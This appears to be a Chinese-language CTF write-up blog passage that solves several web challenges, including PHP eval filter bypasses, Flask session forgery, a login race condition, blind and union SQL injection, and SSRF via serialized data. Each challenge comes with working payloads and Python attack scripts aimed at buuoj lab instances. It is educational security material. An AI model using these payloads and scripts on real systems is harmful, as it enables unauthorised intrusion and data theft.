<h2 id="上海大学生赛2019-decade"><a href="#上海大学生赛2019-decade" class="headerlink" title="[上海大学生赛2019]decade"></a>[上海大学生赛2019]decade</h2><p>第五届上海大学生信息安全竞赛的题目, 这题是上一题的升级版, 不在buu上面, 顺带分析了, 先看源码</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">$code = $_GET[<span class="hljs-string">'code'</span>];</span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($code)) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-string">';'</span> === preg_replace(<span class="hljs-string">'/[a-z]+\((?R)?\)/'</span>, <span class="hljs-keyword">NULL</span>, $code)) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) {</span><br><span class="line">            <span class="hljs-keyword">echo</span> <span class="hljs-string">'bye~'</span>;</span><br><span class="line">                } <span class="hljs-keyword">else</span> {</span><br><span class="line">                    <span class="hljs-keyword">eval</span>($code);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">echo</span> <span class="hljs-string">"invalid"</span>;</span><br><span class="line">        }</span><br><span class="line">}<span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"invalid"</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>翻出之前的payload</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(microtime(chdir(next(scandir(next(each(localeconv()))))))))));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191228000132.png" alt></p>
<p>首先还是fuzz一下可用的函数</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">$list = get_defined_functions()[<span class="hljs-string">'internal'</span>];</span><br><span class="line"><span class="hljs-keyword">foreach</span>($list <span class="hljs-keyword">as</span> $key => $code){</span><br><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) {</span><br><span class="line">        <span class="hljs-keyword">unset</span>($list[$key]);</span><br><span class="line">    } </span><br><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/[^(a-z)]/i'</span>, $code)){</span><br><span class="line">        <span class="hljs-keyword">unset</span>($list[$key]);</span><br><span class="line">    };</span><br><span class="line">}</span><br><span class="line">$out = fopen(<span class="hljs-string">"fuzz.txt"</span>, <span class="hljs-string">"w"</span>);</span><br><span class="line"><span class="hljs-keyword">foreach</span>($list <span class="hljs-keyword">as</span> $key){</span><br><span class="line">    fwrite($out, $key.<span class="hljs-string">"\n"</span>);</span><br><span class="line">}</span><br><span class="line">fclose($out);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后查找一下<code>read</code>相关的函数, <code>readgzfile</code>这个函数可以用</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191228080807.png" alt>其他的如<code>gzread</code>, <code>bzread</code>都因为参数问题无法调用, 但是实际上<code>file</code>函数也是可用的, 不过file函数返回的是数组, 对于<code>echo</code>的话, 不能处理数组, 我们有以下的方法来进行拼接</p>
<ul>
<li>join</li>
<li>serialize</li>
<li>implode</li>
</ul>
<p>接下来就是构造<code>46</code>或者<code>.</code>了, 翻一下<code>boring_code</code>的相关题解, 可以看到构造的方法有这么几种</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>其实大概就是数学方法和随机(玄学)方法, 找到了网上的两种做法分别是</p>
<ul>
<li>玄学做法<br>  <a href="https://xz.aliyun.com/t/6737" target="_blank" rel="noopener">https://xz.aliyun.com/t/6737</a></li>
</ul>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(strrev(uniqid()));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>​    <a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/" target="_blank" rel="noopener">http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/</a></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(ord(hebrevc(crypt(phpversion()))));</span><br></pre></td></tr></tbody></table></figure><p></p>
<ul>
<li>数学方法 <strong>(官方解法)</strong></li>
</ul>
<p>参考<a href="http://blog.sina.com.cn/s/blog_a661ecd501012xsr.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_a661ecd501012xsr.html</a></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))))));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>拼接一下payload即可</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readgzfile(end(scandir(chr(strrev(uniqid(chdir(next(scandir(chr(strrev(uniqid())))))))))));</span><br><span class="line">readgzfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</span><br><span class="line">echo(join(file(end(scandir(next(each(scandir(chr(floor(tan(tan(atan(atan(ord(cos(chdir(next(scandir(chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile()))))))))))))))))))))))))))));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191228082029.png" alt></p>
<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>主要参考自 <a href="https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup" target="_blank" rel="noopener">https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup</a></p>
<p>登录后可以看到有源码位置, 下载来看看</p>
<p><a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p>
<p>下载后看路由<code>routes.py</code>, 这个很可疑的函数就是其中一个突破点</p>
<p><img src="assets/image-20200210204821557.png" alt="image-20200210204821557"></p>
<h3 id="解法一-unicode欺骗"><a href="#解法一-unicode欺骗" class="headerlink" title="解法一 unicode欺骗"></a>解法一 unicode欺骗</h3><p>关于这个函数, 可以看 [unicode 欺骗](<a href="https://panda1g1.github.io/2018/11/15/HCTF" target="_blank" rel="noopener">https://panda1g1.github.io/2018/11/15/HCTF</a> admin/)</p>
<p>简而言之就是</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬ -> A -> a</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>那我们就可以利用这样的操作来登录admin了</p>
<ol>
<li>注册<code>ᴬdmin</code></li>
<li>登录``ᴬdmin<code>, 此时变为</code>Admin`</li>
<li>更改密码, 此时即为<code>admin</code></li>
<li>用新密码登录<code>admin</code>即可</li>
</ol>
<h3 id="解法二-Session欺骗"><a href="#解法二-Session欺骗" class="headerlink" title="解法二 Session欺骗"></a>解法二 Session欺骗</h3><p>原因是泄露了<code>SECRET_KEY</code>, 那么我们就可以解开这个session并伪造了</p>
<p>使用下面这个工具即可</p>
<p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p>
<ol>
<li><p>先注册我们的账号后获取cookie</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=.eJw9kE2LwjAYhP_KkrOHJuteCh4WosWF9y0psSG5iFtr03x0oSpdI_73VVm8zjDPMHMl28PYHi3JT-O5nZFtvyf5lbx9k5wA1xfkQIEvEyaYQK48JkGRGw_Fly8VBkwhGtcwLDAYWXmQ3aRjbUFVvZYN1dJEkHpuuJi0W2bIYELXXYDvIyYbUYYeY-3veY9u84sRe802c1BiQv75DgydkdYiWyfgdTC8u5RF9cg4kEsKTNBS6QW5zUhzHA_b049vh9cEdCKhwghqFTWre-TdBG79oaWeSrWh91qrUwhQiMzwEIyrLIrFE9fHXde-SI0yQ_vvDLvYPiQXs2wgM3I-tuPzOEIzcvsDlENuLg.XkFf9Q.RLHeiZt47umzNlKn7JODZ-bQWts</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
<li><p>解密</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -c '.eJxxxxxxxx' -s 'ckj123'</span><br><span class="line">Output:</span><br><span class="line">"ckj123" -t "{'_fresh': True, '_id': b'06243501373011d74546d0bd9ce79ff764cee4d180bea1dba75a6f168d40b147c068207f78f59b6ed4cd6516cbce81d04073cce8a7b305ed828db6ec1153d59f', 'csrf_token': b'6435cf1afceb480229a609e54cac9e0d4d9ef4a5', 'image': b'qfgy', 'name': 'cjm00n', 'user_id': '10'}"</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
<li><p>然后将<code>name</code>改为admin并加密</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_freshxxxxxx"</span><br><span class="line">Output:</span><br><span class="line">.eJw9kE1rAjEURf9KydqFSe1GcFGIDhbeGzLECclGdBwnn1MYlakR_3utFNeXcy733sj2OLQnS-bn4dJOyNYdyPxG3vZkToDrK3KgwJcZM4wgVwGzoMhNgOIrlAoj5piMbxgWGI2sAshu1Km2oCqnZUO1NAmknhkuRu2XU2Qwou-uwA8Js00oo8NUhwcf0G9-MKHTbDMDJUbkn-_A0BtpLbJ1Bl5Hw7trWVR_jAe5pMAELZVekPuENKfhuD1_h7Z_TUAvMipMoFZJs9oh70bw6w8t9ViqDX3UWp1jhEJMDY_R-MqiWDx1Lu269mVqlOnb_6TfpUdAdofkejIhl1M7PH8jdEruvyuNbi8.XkFg2w.fFLXcLQnZfAYUlnkHDMu79ar_w0</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
<li><p>使用获得的值替换cookie即可</p>
</li>
</ol>
<h3 id="解法三-条件竞争"><a href="#解法三-条件竞争" class="headerlink" title="解法三 条件竞争"></a>解法三 条件竞争</h3><p>这个想法很骚气, 先看下面两处代码</p>
<p>首先是登录处, 将<code>session['name']</code>赋值为我们传的值</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200210220226.png" alt></p>
<p>而更改密码处是直接使用了<code>session['name']</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200210220252.png" alt></p>
<p>我们假设有进程A和B使用了同样的session</p>
<ul>
<li>A请求登录admin, 那么此时<code>session['name']</code>为<code>admin</code></li>
<li>同时B请求改密码, 这时改的就是<code>admin</code>的密码</li>
</ul>
<p>注意在两次操作中sessionid是会改变的</p>
<p>代码实现如下(这里本地搭了一下环境没搭起来, 就不去祸害buu了)</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> threading</span><br><span class="line">url = <span class="hljs-string">"http://269dedc4-b06b-4cdf-ad18-94952755b0b0.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">(s, username, passwd)</span>:</span></span><br><span class="line">    data = {</span><br><span class="line">        <span class="hljs-string">"username"</span>: username,</span><br><span class="line">        <span class="hljs-string">"password"</span>: passwd,</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> s.post(url + <span class="hljs-string">"login"</span>, data=data).text</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span><span class="hljs-params">(s, passwd)</span>:</span></span><br><span class="line">    data = {</span><br><span class="line">        <span class="hljs-string">"newpassword"</span>: passwd</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> s.post(url + <span class="hljs-string">"change"</span>, data=data).text</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">return</span> s.get(url + <span class="hljs-string">"logout"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">format_flag</span><span class="hljs-params">(res)</span>:</span></span><br><span class="line">    pattern = <span class="hljs-string">"flag{.+}"</span></span><br><span class="line">    flag = re.findall(pattern, res)</span><br><span class="line">    <span class="hljs-keyword">if</span> flag:</span><br><span class="line">        <span class="hljs-keyword">return</span> flag[<span class="hljs-number">0</span>]</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tryToChange</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">    login(s, <span class="hljs-string">"cjm00n"</span>, <span class="hljs-string">'cjm00n'</span>)</span><br><span class="line">    change(s, <span class="hljs-string">'cjm00n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tryToLogin</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">    logout(s)</span><br><span class="line">    login(s, <span class="hljs-string">'admin'</span>, <span class="hljs-string">'cjm00n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        t1 = threading.Thread(target=tryToChange, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=tryToLogin, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>先fuzz一下</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200210230344.png" alt></p>
<p>可以看到有布尔的结果, 那么应该是布尔盲注, 然后再看过滤的内容, 其中482长度的为被过滤的</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200210230535.png" alt></p>
<p>这里其实不太明白为什么检测的内容这么少, 回去看源码</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span><span class="hljs-params">($sql)</span></span>{</span><br><span class="line">    $blackList = <span class="hljs-keyword">array</span>(<span class="hljs-string">' '</span>,<span class="hljs-string">'||'</span>,<span class="hljs-string">'#'</span>,<span class="hljs-string">'-'</span>,<span class="hljs-string">';'</span>,<span class="hljs-string">'&'</span>,<span class="hljs-string">'+'</span>,<span class="hljs-string">'or'</span>,<span class="hljs-string">'and'</span>,<span class="hljs-string">'`'</span>,<span class="hljs-string">'"'</span>,<span class="hljs-string">'insert'</span>,<span class="hljs-string">'group'</span>,<span class="hljs-string">'limit'</span>,<span class="hljs-string">'update'</span>,<span class="hljs-string">'delete'</span>,<span class="hljs-string">'*'</span>,<span class="hljs-string">'into'</span>,<span class="hljs-string">'union'</span>,<span class="hljs-string">'load_file'</span>,<span class="hljs-string">'outfile'</span>,<span class="hljs-string">'./'</span>);</span><br><span class="line">    <span class="hljs-keyword">foreach</span>($blackList <span class="hljs-keyword">as</span> $blackitem){</span><br><span class="line">        <span class="hljs-keyword">if</span>(stripos($sql,$blackitem)){</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这里用的函数是<code>stripos</code>, 那么就很明显了, 如果出现在第一位, 则函数结果为<code>0</code>, 在类型转换后就是<code>False</code>, 所以前期fuzz就不顺利了hhh</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200210231557.png" alt></p>
<p>重新fuzz结果</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200210231842.png" alt></p>
<p>然后就构造一下盲注的payload, 这里可以用</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((select(flag)from(flag)),1,1))>1,1,0)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>或者使用异或也可以</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^(ascii(substr((select(flag)from(flag)),1,1))>1)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>写个脚本跑一下</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">"http://1d7350ba-68f1-47e8-b269-3381908ddae5.node3.buuoj.cn/index.php"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attack</span><span class="hljs-params">(cur, mid)</span>:</span></span><br><span class="line">    payload = <span class="hljs-string">"if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,0)"</span> % (cur, mid)</span><br><span class="line">    res = requests.post(url, data={<span class="hljs-string">"id"</span>:payload}).text</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-string">"glzjin"</span> <span class="hljs-keyword">in</span> res:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    flag = <span class="hljs-string">""</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">43</span>):</span><br><span class="line">        end = <span class="hljs-number">127</span></span><br><span class="line">        start = <span class="hljs-number">1</span></span><br><span class="line">        mid = (end + start) // <span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-keyword">while</span> end > start:</span><br><span class="line">            <span class="hljs-keyword">if</span> attack(i, mid):</span><br><span class="line">                start = mid + <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">            mid = (end + start) // <span class="hljs-number">2</span></span><br><span class="line">            sleep(<span class="hljs-number">0.3</span>)</span><br><span class="line">        flag += chr(mid)</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200210231326.png" alt></p>
<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>一开始以为是二次注入, 不过发现他点击用户名之后, 有个请求页面的功能, 同时观察到url有个<code>no=1</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200211001837.png" alt></p>
<p>这里一定有请求数据库, 那么先注入一下, </p>
<p>发现没有什么过滤, 回显在第二列,依次注入后, 发现data中是一个反序列化字符串</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0%20union/**/select%201,(select%20group_concat(data)%20from%20users),3,4%23</span><br><span class="line">Output:</span><br><span class="line">O:8:"UserInfo":3:{s:4:"name";s:6:"cjm00n";s:3:"age";i:1;s:4:"blog";s:10:"cjm00n.top";}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>我们再观察一下, 他有个<code>robots.txt</code>, 内容如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>访问后可以看到一部分源码</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200211002248.png" alt></p>
<p>这里可以看到有个<code>curl</code>, 那么试试file协议</p>
<p>在注入中将结果更改为<code>file:///var/www/html/flag.php</code></p>
<p>一开始没找到, 看wp中是在这个位置</p>
<p>payload如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0%20union/**/select%201,(select%20group_concat(data)%20from%20users),3,'O:8:"UserInfo":3:{s:4:"name";s:6:"cjm00n";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'%23</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后base64解开即可</p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>直接上payload吧</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1'union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'%23&pw=123456</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>其中<code>e10adc3949ba59abbe56e057f20f883e</code>=<code>MD5(123456)</code></p>
<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>首先点进去, 随便注册个账号, 发现有文件上传功能, 先上传一个试试, </p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213195555.png" alt></p>
<p>看一下<code>下载</code>的功能</p>
<p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">var</span> filename = $(<span class="hljs-keyword">this</span>).parent().attr(<span class="hljs-string">"filename"</span>);</span><br><span class="line">    <span class="hljs-keyword">var</span> form = $(<span class="hljs-string">'<form method="POST" target="_blank"></form>'</span>);</span><br><span class="line">    form.attr(<span class="hljs-string">'action'</span>, <span class="hljs-string">'download.php'</span>);</span><br><span class="line">    <span class="hljs-keyword">var</span> input = $(<span class="hljs-string">'<input type="hidden" name="filename" value="'</span> + filename + <span class="hljs-string">'"></input>'</span>)</span><br><span class="line">    $(<span class="hljs-built_in">document</span>.body).append(form);</span><br><span class="line">    $(form).append(input);</span><br><span class="line">    form.submit();</span><br><span class="line">    form.remove();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deletefile</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">var</span> filename = $(<span class="hljs-keyword">this</span>).parent().attr(<span class="hljs-string">"filename"</span>);</span><br><span class="line">    <span class="hljs-keyword">var</span> data = {</span><br><span class="line">        <span class="hljs-string">"filename"</span>: filename</span><br><span class="line">    };</span><br><span class="line">    $.ajax({</span><br><span class="line">        url: <span class="hljs-string">'delete.php'</span>,</span><br><span class="line">        type: <span class="hljs-string">'POST'</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        success: <span class="hljs-function"><span 